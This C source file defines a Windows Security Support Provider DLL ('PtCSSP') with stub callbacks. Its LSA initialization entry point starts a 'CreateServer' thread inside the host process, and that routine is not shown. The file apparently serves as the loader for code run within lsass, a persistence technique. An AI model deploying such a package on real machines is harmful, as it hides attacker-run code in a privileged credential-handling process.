#include "SSP.h"

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable);
NTSTATUS NTAPI SpShutDown(void);
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo);
NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);

static SECPKG_FUNCTION_TABLE SecPkgFunctionTable[] = {
    {
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    return 0;
}

NTSTATUS NTAPI SpShutDown(void)
{
    return 0;
}

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion = 1;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->Name = L"PtCSSP";
    PackageInfo->Comment = L"PtC Security Support Provider";
    return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    return 0;
}

__declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    CreateThread(NULL, 0, CreateServer, NULL, 0, NULL);

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecPkgFunctionTable;
    *pcTables = ARRAYSIZE(SecPkgFunctionTable);

    return 0;
}